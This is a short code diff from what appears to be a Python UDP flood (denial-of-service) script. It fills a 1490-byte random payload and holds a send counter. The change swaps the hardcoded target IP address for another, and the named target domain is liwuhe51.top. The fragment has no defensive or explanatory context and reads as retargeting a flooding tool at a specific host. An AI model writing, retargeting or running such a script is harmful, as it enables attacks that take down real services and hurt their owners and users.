@@ -16,7 +16,7 @@ bytes = random._urandom(1490)
 # Get ip.
 url = "liwuhe51.top"
 #ip = socket.gethostbyname(url)
-ip = "103.82.54.28"
+ip = "43.251.101.121"
 
 # Value.
 sent = 1
